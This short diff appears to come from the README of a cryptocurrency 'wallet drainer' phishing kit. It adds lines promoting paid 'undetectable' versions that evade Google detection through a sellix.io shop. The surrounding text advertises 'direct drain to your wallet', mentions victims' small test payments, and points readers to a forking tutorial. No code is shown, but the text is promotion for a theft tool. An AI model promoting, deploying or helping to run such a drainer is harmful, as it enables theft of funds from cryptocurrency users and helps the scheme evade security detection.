@@ -1,3 +1,6 @@
+### THIS FREE SCRIPT IS OFTEN DETECTED BY GOOGLE FASTER SO FOR DIRECT UNDETECTEDABLE SCRIPTS https://moneywithbots.sellix.io/ ###
+
+
 
 !!!!!!!For direct drain to your wallet with no custom smart contract https://moneywithbots.sellix.io/ !!!!!!!!!!!!!
 
@@ -21,6 +24,8 @@ If you notice small payments made to you thats because most people test the site
 Instructions on how to start are below ⬇️
 
               ##########
+
+### THIS FREE SCRIPT IS OFTEN DETECTED BY GOOGLE FASTER SO FOR DIRECT UNDETECTEDABLE SCRIPTS https://moneywithbots.sellix.io/ ###
 
 
 Make sure you fork this project before doing the tutorial here is how to fork https://www.youtube.com/watch?v=f5grYMXbAV0
